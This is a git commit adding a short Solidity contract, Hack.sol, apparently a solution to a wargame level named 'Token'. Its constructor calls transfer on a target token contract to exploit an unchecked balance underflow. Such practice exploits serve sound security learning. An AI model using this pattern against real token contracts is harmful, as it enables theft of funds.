eefe9366c840c1ec0cdfbe75d9925aef15b5cb62
Marc Gonzalez Amores <57719399+marcgoam@users.noreply.github.com>
2023-06-28 10:50:03 +0200

    Update Hack.sol

--- 4. Token/Hack.sol
+++ 4. Token/Hack.sol
@@ -1,1 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IToken {
+    function balanceOf(address _owner) external view returns (uint balance);
+    function transfer(address _to, uint _value) external returns (bool);
+}
+
+contract Hack {
+    constructor(address _addr) {
+        IToken(_addr).transfer(msg.sender, 1);
+    }
+}
 
